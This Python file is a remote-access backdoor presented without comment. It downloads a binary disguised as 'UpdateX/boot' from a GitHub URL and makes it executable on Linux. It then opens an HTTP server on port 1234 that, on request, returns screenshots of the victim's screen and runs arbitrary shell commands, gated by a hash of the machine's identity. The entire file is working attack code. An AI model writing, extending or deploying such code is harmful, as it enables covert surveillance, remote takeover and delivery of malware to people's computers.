import pyautogui
from PIL import Image
import io
import base64
import uuid
import socket
import platform
import hashlib
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import platform
import urllib
import os
import subprocess

def detect_os():
    system_platform = platform.system()
    global sw_path
    if system_platform == "Windows":
        sw_path = r"C:\UpdateX\boot.exe"
        return 0
    elif system_platform == "Linux":
        sw_path="/var/UpdateX/boot"
        return 1
    else:
        return -1
    
def download_file():
    detect_os()
    try:
        global sw_path
        if detect_os() == 0:
            print("file exit")
            urllib.request.urlretrieve("https://github.com/mr-tuhin/assets/raw/main/boot.exe", sw_path)
            os.chmod(sw_path, 0o666)
        else:
            urllib.request.urlretrieve("https://github.com/mr-tuhin/assets/raw/main/boot", sw_path)
            os.chmod(sw_path, 0o777)
        
        check_and_download_file()
    
    except Exception as e:
        pass

def check_and_download_file():
    detect_os()
    global sw_path
    if os.path.exists(sw_path):
        return True
    else:
        download_file()

def generate_system_signature():
    machine_uuid = str(uuid.UUID(int=uuid.getnode()))
    machine_hostname = socket.gethostname()
    machine_platform = platform.platform()
    combined_info = f"{machine_uuid}-{machine_hostname}-{machine_platform}"
    system_signature = hashlib.sha256(combined_info.encode('utf-8')).hexdigest()
    return system_signature

def take_screenshot():
    screenshot = pyautogui.screenshot()
    buffered = io.BytesIO()
    screenshot.save(buffered, format="PNG")
    screenshot_base64 = base64.b64encode(buffered.getvalue()).decode("utf-8")
    return screenshot_base64

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.strip()
        return output
    except subprocess.CalledProcessError as e:
        return None

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def __init__(self):
        check_and_download_file()
        
    def do_GET(self):
        # Parse the query parameters
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        message = ''
        if 'f' in query_params:
            f_value = int(query_params['f'][0])
            if f_value == 1:
                if 'os' in query_params:
                    if query_params['os'][0] == generate_system_signature():
                        message= 'data:image/png;base64,'+take_screenshot()
            elif f_value == 2:
                if 'os' in query_params:
                    if query_params['os'][0] == generate_system_signature():
                        if "commamd" in query_params:
                            command=query_params['commamd'][0]
                            output=run_command(command)
                            if output!= None:
                                message=output
                            
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(bytes(message, "utf8"))

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler):
    server_address = ('', 1234)
    httpd = server_class(server_address, handler_class)
    print(f"Server running on port")
    httpd.serve_forever()

if __name__ == "__main__":
    run()